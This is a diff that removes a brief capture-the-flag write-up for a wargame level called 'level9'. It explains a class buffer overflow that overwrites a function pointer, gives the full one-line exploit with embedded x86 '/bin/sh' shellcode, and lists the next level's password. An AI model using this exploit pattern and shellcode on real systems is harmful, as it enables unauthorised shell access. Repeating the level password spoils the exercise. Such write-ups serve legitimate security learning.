@@ -1,8 +1,0 @@
-You have 2 class following
-in the first one you can make an overflow and errase the fonction pointer of the second to point to a shell code.
-When the fonction pointer of the second class is call, it's call the shell code
-
-./level9 `echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x7c\xa0\x04\x08\x80\xa0\x04\x08\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"`
-
-password bonus0 : f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
-
